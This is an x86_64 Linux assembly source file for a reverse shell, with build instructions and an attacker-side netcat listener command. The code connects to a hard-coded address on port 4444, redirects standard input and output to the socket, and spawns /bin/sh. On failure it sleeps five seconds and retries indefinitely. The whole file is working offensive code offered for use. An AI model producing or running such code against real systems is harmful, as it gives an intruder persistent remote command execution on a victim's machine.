; client_corrected.asm - Reverse shell (x86_64 Linux)
; Assemble: nasm -f elf64 client_corrected.asm -o client.o && ld client.o -o client
; To connect from the attacker's side : nc -lvp 4444

global _start

section .text

_start:
retry:
    ; ----------------------------
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    ; ----------------------------
    xor rax, rax
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    mov rdx, 6          ; IPPROTO_TCP
    mov rax, 41         ; syscall: socket
    syscall
    mov r8, rax         ; sauvegarde du socket fd

    ; ----------------------------
    ; Préparation de sockaddr_in
    ; ----------------------------
    sub rsp, 16         ; réserver 16 octets pour sockaddr_in

    mov word [rsp], 2       ; sin_family = AF_INET
    mov word [rsp+2], 0x5c11 ; sin_port = htons(4444)
    mov dword [rsp+4], 0x0100007F ; sin_addr = 127.0.0.0
    mov qword [rsp+8], 0     ; padding/zero

    ; ----------------------------
    ; connect(socket, sockaddr*, 16)
    ; ----------------------------
    mov rdi, r8         ; socket fd
    mov rsi, rsp        ; sockaddr*
    mov rdx, 16
    mov rax, 42         ; syscall: connect
    syscall
    test rax, rax
    js error

.suite:
    ; ----------------------------
    ; dup2(socket, 0), (1), (2)
    ; ----------------------------
    mov rsi, 0
.dup_loop:
    mov rax, 33         ; syscall: dup2
    mov rdi, r8         ; socket fd
    syscall
    inc rsi
    cmp rsi, 3
    jl .dup_loop

    ; ----------------------------
    ; execve("/bin/sh", NULL, NULL)
    ; ----------------------------
    xor rax, rax
    push rax                    ; NULL
    mov rbx, 0x68732f6e69622f2f ; "/bin//sh" (little endian)
    push rbx
    mov rdi, rsp                ; rdi = pointer to "/bin//sh"
    xor rsi, rsi                ; argv = NULL
    xor rdx, rdx                ; envp = NULL
    mov rax, 59                 ; syscall: execve
    syscall
	
	
error:
	jmp wait_and_retry

wait_and_retry:
    ; close the socket first: syscall close(socket_fd)
    mov rax, 3         ; syscall: close
    mov rdi, r8
    syscall

    ; Prepare timespec struct on stack (5 sec sleep)
    ; struct timespec { time_t tv_sec; long tv_nsec; }
    sub rsp, 16
    mov qword [rsp], 5       ; 5 seconds
    mov qword [rsp+8], 0     ; 0 nanoseconds

    mov rdi, rsp             ; const struct timespec *req
    xor rsi, rsi             ; NULL for remaining time
    mov rax, 35              ; syscall: nanosleep
    syscall

    add rsp, 16              ; clean timespec struct
    add rsp, 16              ; clean sockaddr_in

    jmp retry               ; try again
